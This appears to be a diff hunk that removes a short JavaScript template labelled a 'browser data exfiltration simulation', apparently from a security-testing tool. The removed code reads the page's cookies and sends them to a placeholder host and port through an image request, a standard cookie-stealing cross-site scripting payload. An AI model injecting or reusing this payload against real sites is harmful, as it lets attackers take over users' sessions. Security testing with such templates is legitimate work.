@@ -1,5 +1,0 @@
-// Browser Data Exfiltration Simulation
-(function(){
-    var data = encodeURIComponent(document.cookie);
-    new Image().src = "http://{{ ip }}:{{ port }}/?data=" + data;
-})();
